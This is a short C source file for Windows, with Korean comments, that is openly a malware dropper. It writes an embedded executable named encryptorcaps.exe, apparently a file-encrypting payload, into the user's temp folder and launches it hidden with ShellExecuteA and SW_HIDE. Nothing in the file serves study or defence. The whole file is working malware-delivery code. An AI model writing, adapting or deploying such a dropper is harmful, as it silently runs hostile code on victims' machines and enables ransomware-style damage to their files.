#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include "encryptor_payload.h"  // 여기에는 encryptorcaps_exe / encryptorcaps_exe_len 이 있음

void drop_and_execute() {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char exePath[MAX_PATH];
    snprintf(exePath, MAX_PATH, "%s\\encryptorcaps.exe", tempPath);

    FILE* fp = fopen(exePath, "wb");
    if (!fp) {
        MessageBoxA(NULL, "파일 저장 실패!", "Dropper", MB_OK | MB_ICONERROR);
        return;
    }

    //  정확한 변수명 사용
    fwrite(encryptorcaps_exe, 1, encryptorcaps_exe_len, fp);
    fclose(fp);

    ShellExecuteA(NULL, "open", exePath, NULL, NULL, SW_HIDE);
}

int main() {
    drop_and_execute();
    return 0;
}